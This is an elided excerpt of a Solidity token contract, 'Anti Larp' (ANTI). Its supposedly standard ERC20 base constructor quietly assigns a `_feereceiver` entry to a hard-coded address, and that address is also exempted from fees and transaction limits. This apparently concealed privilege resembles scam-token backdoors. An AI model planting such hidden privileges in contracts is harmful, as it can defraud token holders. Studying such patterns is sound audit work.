...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0xDdc41c7B28B5ab2F26748aBedA63022694C3535F] = _marketingwallet;
    }
...
contract ANTI is ERC20, Ownable {
    ...
    constructor() ERC20("Anti Larp", "ANTI") {
        ...
        excludeFromFees(address(0xDdc41c7B28B5ab2F26748aBedA63022694C3535F), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xDdc41c7B28B5ab2F26748aBedA63022694C3535F), true);
